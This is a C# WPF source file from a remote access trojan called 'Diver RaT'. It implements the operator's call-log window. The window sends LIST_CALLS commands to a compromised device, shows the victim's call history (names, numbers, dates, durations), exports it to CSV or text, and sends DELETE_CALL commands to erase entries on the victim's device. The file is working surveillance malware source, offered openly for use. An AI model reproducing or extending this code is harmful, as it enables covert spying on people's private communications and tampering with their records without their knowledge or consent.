using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Text.Json;
using System.Windows;
using System.Windows.Media;
using Microsoft.Win32;

namespace Diver_RaT
{
    public partial class CallLogsWindow : Window
    {
        private readonly TcpServer _server;
        private readonly Device _device;
        private List<CallLogItem> _all = new();

        public CallLogsWindow(TcpServer server, Device device)
        {
            InitializeComponent();
            _server = server;
            _device = device;
            Title = $"Call Logs - {device.ComputerName}";
            TargetText.Text = $"{device.ComputerName} ({device.IpAddress})";
            _ = RefreshAsync();
        }

        private async System.Threading.Tasks.Task RefreshAsync()
        {
            LoadingOverlay.Visibility = Visibility.Visible;
            StatusText.Text = "Reading call logs...";
            try
            {
                var result = await _server.SendCommandAsync(_device.Id, "LIST_CALLS", timeoutMs: 30000);
                if (!result.Success || string.IsNullOrEmpty(result.Result))
                {
                    StatusText.Text = $"Failed: {result.Error}";
                    return;
                }
                var items = new List<CallLogItem>();
                try
                {
                    using var doc = JsonDocument.Parse(result.Result);
                    foreach (var e in doc.RootElement.EnumerateArray())
                    {
                        var type = e.TryGetProperty("type", out var t) ? t.GetInt32() : 0;
                        var date = e.TryGetProperty("date", out var d) ? d.GetInt64() : 0L;
                        items.Add(new CallLogItem
                        {
                            Id = e.TryGetProperty("id", out var i) ? i.GetString() ?? "" : "",
                            Name = e.TryGetProperty("name", out var n) ? n.GetString() ?? "" : "",
                            Number = e.TryGetProperty("number", out var p) ? p.GetString() ?? "" : "",
                            TypeText = type switch { 1 => "Incoming", 2 => "Outgoing", 3 => "Missed", _ => type.ToString() },
                            DateText = date > 0 ? DateTimeOffset.FromUnixTimeMilliseconds(date).ToLocalTime().ToString("yyyy-MM-dd HH:mm:ss") : "",
                            Duration = e.TryGetProperty("duration", out var dr) ? dr.GetInt64() : 0L
                        });
                    }
                }
                catch (Exception ex)
                {
                    StatusText.Text = $"Invalid call log: {ex.Message}";
                    return;
                }
                _all = items;
                ApplyFilter();
                StatusText.Text = $"{_all.Count} call(s)  |  updated {DateTime.Now:HH:mm:ss}";
            }
            finally
            {
                LoadingOverlay.Visibility = Visibility.Collapsed;
            }
        }

        private void ApplyFilter()
        {
            var q = SearchBox.Text.Trim();
            if (q.Length == 0) { CallsGrid.ItemsSource = _all; return; }
            CallsGrid.ItemsSource = _all.FindAll(i =>
                i.Name.Contains(q, StringComparison.OrdinalIgnoreCase) ||
                i.Number.Contains(q));
        }

        private void RefreshButton_Click(object sender, RoutedEventArgs e) => _ = RefreshAsync();

        private void SearchBox_TextChanged(object sender, System.Windows.Controls.TextChangedEventArgs e) => ApplyFilter();

        private void ExportButton_Click(object sender, RoutedEventArgs e)
        {
            if (_all.Count == 0) return;
            var dlg = new SaveFileDialog
            {
                FileName = $"call_logs_{_device.ComputerName}_{DateTime.Now:yyyyMMdd_HHmmss}",
                Filter = "CSV file|*.csv|Text file|*.txt"
            };
            if (dlg.ShowDialog(this) != true) return;
            var isCsv = dlg.FilterIndex == 1 || dlg.FileName.EndsWith(".csv", StringComparison.OrdinalIgnoreCase);
            var sb = new StringBuilder();
            if (isCsv)
            {
                sb.AppendLine("Name,Number,Type,Date,DurationSeconds");
                foreach (var c in _all)
                    sb.AppendLine(Csv(c.Name) + "," + Csv(c.Number) + "," + Csv(c.TypeText) + "," +
                                  Csv(c.DateText) + "," + c.Duration.ToString());
            }
            else
            {
                foreach (var c in _all)
                    sb.AppendLine($"{c.DateText}  [{c.TypeText}]  {c.Name} ({c.Number})  {c.Duration}s");
            }
            File.WriteAllText(dlg.FileName, sb.ToString());
            StatusText.Text = $"Exported {_all.Count} call(s) to {dlg.FileName}";
        }

        private void CallsGrid_ContextMenuOpening(object sender, System.Windows.Controls.ContextMenuEventArgs e)
        {
            if (e.OriginalSource is not DependencyObject source) return;
            var row = FindVisualParent<System.Windows.Controls.DataGridRow>(source);
            if (row?.Item is CallLogItem item) CallsGrid.SelectedItem = item;
        }

        private async void DeleteMenu_Click(object sender, RoutedEventArgs e)
        {
            if (CallsGrid.SelectedItem is not CallLogItem item || string.IsNullOrEmpty(item.Id)) return;
            var ok = MessageBox.Show($"Delete call log entry '{item.Name}' ({item.Number})?", "Diver RaT - Delete Call Log",
                MessageBoxButton.YesNo, MessageBoxImage.Warning) == MessageBoxResult.Yes;
            if (!ok) return;

            StatusText.Text = "Deleting call log entry...";
            var result = await _server.SendCommandAsync(_device.Id, "DELETE_CALL",
                new Dictionary<string, string> { ["id"] = item.Id });
            StatusText.Text = result.Success ? $"Deleted: {result.Result}" : $"Delete failed: {result.Error}";
            await RefreshAsync();
        }

        private static string Csv(string s) => "\"" + s.Replace("\"", "\"\"") + "\"";

        private static T? FindVisualParent<T>(DependencyObject? child) where T : DependencyObject
        {
            while (child is not null)
            {
                if (child is T match) return match;
                child = VisualTreeHelper.GetParent(child);
            }
            return null;
        }
    }

    public class CallLogItem
    {
        public string Id { get; set; } = "";
        public string Name { get; set; } = "";
        public string Number { get; set; } = "";
        public string TypeText { get; set; } = "";
        public string DateText { get; set; } = "";
        public long Duration { get; set; }
    }
}